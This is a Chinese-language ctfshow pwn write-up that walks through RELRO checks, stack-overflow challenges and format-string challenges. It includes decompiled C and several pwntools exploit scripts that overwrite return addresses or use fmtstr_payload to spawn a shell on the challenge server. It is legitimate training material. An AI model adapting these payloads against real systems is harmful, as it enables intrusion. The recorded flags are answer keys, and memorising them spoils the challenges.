+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.44.14.png" alt="截屏2025-08-11 19.44.14" style="zoom:50%;">
+
+<p>故：ctfshow{1_1_0x600f18_0x600f28}</p>
+<hr>
+<h2 id="22-pwn21"><a href="#22-pwn21" class="headerlink" title="22 pwn21"></a>22 pwn21</h2><p>🚩flag：<code>ctfshow{0_1_0x600ff0_0x601000}</code></p>
+<p>💡hint：<code>Linux安全机制</code></p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure>
+
+<p>部分防护。</p>
+<p>![截屏2025-08-11 19.47.08](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.47.08.png)</p>
+<p>查看表的地址：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![截屏2025-08-11 19.47.53](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.47.53.png)</p>
+<p>ctfshow{0_1_0x600ff0_0x601000}</p>
+<hr>
+<h2 id="23-pwn22"><a href="#23-pwn22" class="headerlink" title="23 pwn22"></a>23 pwn22</h2><p>🚩flag：<code>ctfshow{0_0_0x600fc0}</code></p>
+<p>💡hint：<code>Linux安全机制</code></p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![截屏2025-08-11 19.49.19](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.49.19.png)</p>
+<p><strong>Full RELRO</strong>：启动时立即解析所有符号并完全锁定GOT为只读，提供最强保护但会略微增加启动时间。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.51.24.png" alt="截屏2025-08-11 19.51.24" style="zoom:50%;">
+
+<p>在写.got表的时候就会抛出异常，而.got.plt不存在 故flag:ctfshow{0_0_0x600fc0}</p>
+<hr>
+<h2 id="24-pwn23"><a href="#24-pwn23" class="headerlink" title="24 pwn23"></a>24 pwn23</h2><p>🚩flag：<code>ctfshow{d9d1e78b-1dab-44d8-a705-6c8346051804}</code></p>
+<p>💡hint：<code>缓冲区溢出漏洞</code></p>
+<p>用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</p>
+<figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">ssh ctfshow@题目地址 -p题目端口号</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-8h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"/ctfshow_flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"/ctfshow_flag: No such file or directory."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  signal(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);</span><br><span class="line">  v3 = getegid();</span><br><span class="line">  setresgid(v3, v3, v3, v5, v6, v7, v3);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048940);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B4);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A30);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ABC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B4C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048BD0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048C64);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Linux_Security_Mechanisms                               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : No canary found                                         "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How to input ?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">1</span> )</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<ol>
+<li><p>首先，程序尝试打开名为”/ctfshow_flag”的文件，并将文件指针赋值给 stream变量。如果打开文件失败（文件不存在或无法访问），程序输出错误消息并终止。</p>
+</li>
+<li><p>如果成功打开文件，程序使用 fgets 函数从文件中读取最多64个字符到名为 flag 的缓冲区。</p>
+</li>
+<li><p>程序输出提示消息： “How to input?”。</p>
+</li>
+<li><p>如果程序运行时传入了命令行参数（ argc大于1），则调用 ctfshow 函数，并将第一个命令 行参数作为参数传递给该函数。</p>
+</li>
+<li><p>ctfshow 函数很简单，它接受一个字符串参数 src ，并使用 strcpy 函数将该字符串复制到名 为 dest 的缓冲区中。然后，它返回指向 dest缓冲区的指针。</p>
+</li>
+</ol>
+<p>这里仅仅是为了演示当未开启Canary保护时，输入字符串长度超过了 dest 缓冲区的大小，这可能导致缓冲区溢出漏洞。</p>
+<p>![截屏2025-08-11 20.03.33](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.03.33.png)</p>
+<hr>
+<blockquote>
+<p>25~29 为栈溢出</p>
+</blockquote>
+<h2 id="25-pwn35"><a href="#25-pwn35" class="headerlink" title="25 pwn35"></a>25 pwn35</h2><p>🚩flag：<code>ctfshow{d5502ece-4e3a-45ec-9e5c-2c7f9ca78a09}</code></p>
+<p>💡hint：<code>栈溢出</code></p>
+<p>正式开始栈溢出了，先来一个最最最最简单的吧</p>
+<p>ctfshow{d5502ece-4e3a-45ec-9e5c-2c7f9ca78a09}</p>
+<p>![截屏2025-08-11 20.11.02](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.11.02.png)</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![截屏2025-08-11 20.12.43](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.12.43.png)</p>
+<p>32位程序开启NX，部分开启RELRO 32位</p>
+<p>IDA查看main函数：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+0h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"/ctfshow_flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"/ctfshow_flag: No such file or directory."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  signal(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048910);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048984);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A8C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B1C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048BA0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048C34);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Stack_Overflow                                          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : See what the program does!                              "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Where is flag?\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"QaQ!FLAG IS NOT HERE! Here is your input : %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>打开”/ctfshow_flag” 文件，读取其中的内容，并根据命令行参数决定打印不同的消息。如果命令行 参数个数小于等于 1 ，则提示用户重试，否则调用  ctfshow 函数处理用户输入的命令行参数，并输出相关消息。</p>
+<p>跟进ctfshow函数：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>char dest:  声明一个名为 dest 的字符变量。 return strcpy(&amp;dest, src): 使用 strcpy 函 数将 src 字符串复制到 dest 字符数组中，并返回指向 dest 的指针。 strcpy函数这个函数是一个典 型的可以用来利用溢出的函数。所以我们可以在这里进行栈溢出。</p>
+<p>注意到signal(11, (__sighandler_t)sigsegv_handler);函数</p>
+<p>当发生 对存储的无效访问时,会把stderr打印输出,即将flag的值打印输出</p>
+<p>那么我们直接输入超长数据就会溢出，程序就会崩溃进而打印出flag</p>
+<hr>
+<h2 id="26-pwn36"><a href="#26-pwn36" class="headerlink" title="26 pwn36"></a>26 pwn36</h2><p>🚩flag：<code>ctfshow{8197d563-2f34-41d7-94b0-a2ae5fe8d0f0}</code></p>
+<p>💡hint：<code>栈溢出</code></p>
+<p>存在后门函数，如何利用？</p>
+<p>先来checksec</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![截屏2025-08-11 20.17.29](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.17.29.png)</p>
+<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
+<p>ida查看main函数：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Stack_Overflow                                          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : There are backdoor functions here!                      "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Find and use it!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter what you want: "</span>);</span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>跟进ctfshow函数：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用  gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出 s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>,log_level = <span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28187</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">flag = elf.sym[<span class="string">'get_flag'</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>+<span class="number">4</span>) + p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>运行脚本即可得到flag。</p>
+<hr>
+<h2 id="27-pwn37"><a href="#27-pwn37" class="headerlink" title="27 pwn37"></a>27 pwn37</h2><p>🚩flag：<code>ctfshow{00b37148-e0b5-422c-9a92-0fbe1310dc78}</code></p>
+<p>💡hint：<code>栈溢出</code></p>
+<p>32位的 system(“/bin/sh”) 后门函数给你</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别和架构</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择本地调试或远程连接（二选一）</span></span><br><span class="line"><span class="comment"># io = process('./pwn')  # 本地调试</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28228</span>)  <span class="comment"># 远程连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载ELF文件</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">backdoor_addr = elf.sym[<span class="string">'backdoor'</span>]  <span class="comment"># 获取backdoor函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload：填充偏移 + 返回地址</span></span><br><span class="line">offset = <span class="number">0x12</span> + <span class="number">4</span>  <span class="comment"># 假设偏移量是0x12 + 4（覆盖返回地址）</span></span><br><span class="line">payload = <span class="string">b'A'</span> * offset + p32(backdoor_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并交互</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>溢出覆盖返回地址再输入后门函数地址即可控制程序的执行流程</p>
+<hr>
+<h2 id="28-pwn38"><a href="#28-pwn38" class="headerlink" title="28 pwn38"></a>28 pwn38</h2><p>🚩flag：<code>ctfshow{3fc5ea88-fa41-45c3-b57c-861618063a48}</code></p>
+<p>💡hint：<code>栈溢出</code></p>
+<p>64位的 system(“/bin/sh”) 后门函数给你</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28270</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(<span class="number">0x40065B</span>) + p64(<span class="number">0x400657</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>思路和上一个题目类似。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> ctfshow_flag</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![截屏2025-08-11 20.49.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.49.48.png)</p>
+<hr>
+<h2 id="29-pwn39"><a href="#29-pwn39" class="headerlink" title="29 pwn39"></a>29 pwn39</h2><p>🚩flag：<code>ctfshow{4a15a146-0370-4287-b0b1-a047a5779ae1}</code></p>
+<p>💡hint：<code>栈溢出</code></p>
+<p>32位的 system(); “/bin/sh”</p>
+<p>漏洞函数ctfshow()。</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28309</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(<span class="number">0x80483A0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x8048750</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![截屏2025-08-11 20.56.31](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.56.31.png)</p>
+<hr>
+<blockquote>
+<p>30~33为格式化字符</p>
+</blockquote>
+<h2 id="30-pwn91"><a href="#30-pwn91" class="headerlink" title="30 pwn91"></a>30 pwn91</h2><p>🚩flag：<code>ctfshow{2d4ff392-5150-475d-a7c1-443e845a4b4d}</code></p>
+<p>💡hint：<code>格式化字符串</code></p>
+<p>开始格式化字符串了，先来个简单的吧</p>
+<p>![截屏2025-08-11 21.17.10](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 21.17.10.png)</p>
+<p>32位关闭PIE，部分开启RELRO</p>
+<p>ida查看main函数</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">if</span> ( daniu == <span class="number">6</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"daniu praise you for a good job!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到当daniu = 6 的时候即可获的一个shell</p>
+<p>跟进ctfshow函数：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [esp+Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x50u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"daniu now is :%d!\n"</span>, daniu);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到这里的ptintf(s)明显的存在格式化字符串漏洞</p>
+<p>daniu的地址为： 0x804B038</p>
+<p>![截屏2025-08-11 21.21.42](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 21.21.42.png)</p>
+<p>可以看到daniu在bss段，测一下格式化字符串的偏移，可以看到偏移为7</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28262</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标地址</span></span><br><span class="line">daniu = <span class="number">0x804B038</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式化字符串payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, {daniu: <span class="number">6</span>})</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并交互</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>通过shell获取flag。</p>
+<hr>
+<h2 id="31-pwn92"><a href="#31-pwn92" class="headerlink" title="31 pwn92"></a>31 pwn92</h2><p>🚩flag：<code>ctfshow{4f5e810f-72b6-447f-8a30-a74822609048}</code></p>
+<p>💡hint：<code>格式化字符串</code></p>
+<p>可能上一题没太看懂？来看下基础吧</p>
+<p>ida分析函数，得知使用用户输入的格式化字符串将 s 输出，如果需要获取flag，仅仅需要使用 %s 输出flag字符串即可获取flag</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28223</span>) </span><br><span class="line">io.sendline(<span class="string">'%s'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="32-pwn93"><a href="#32-pwn93" class="headerlink" title="32 pwn93"></a>32 pwn93</h2><p>🚩flag：<code>ctfshow{cc14b02c-70f9-461e-aa67-96516a0834a0}</code></p>
+<p>💡hint：<code>格式化字符串</code></p>
+<p>emmm，再来一道基础原理？</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter your choice: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      func1();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      func2();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      func3();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      func4();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      func5();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      nothing_here();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      exit0();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice. Please enter a valid option."</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>跟进菜单：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Choose an option:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.Crash the program"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.Stack data breaches"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.Arbitrary address memory leak"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.Stack data override"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5.Arbitrary address memory override"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"6. ... "</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>获取flag的地方在case 7 exit0()函数，跟进后发现其实是一个后门函数：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">exit0</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">72</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  stream = fopen(<span class="string">"/ctfshow_flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"/ctfshow_flag: No such file or directory."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>也就是说读取用户输入的时候输入7即可获得flag。</p>
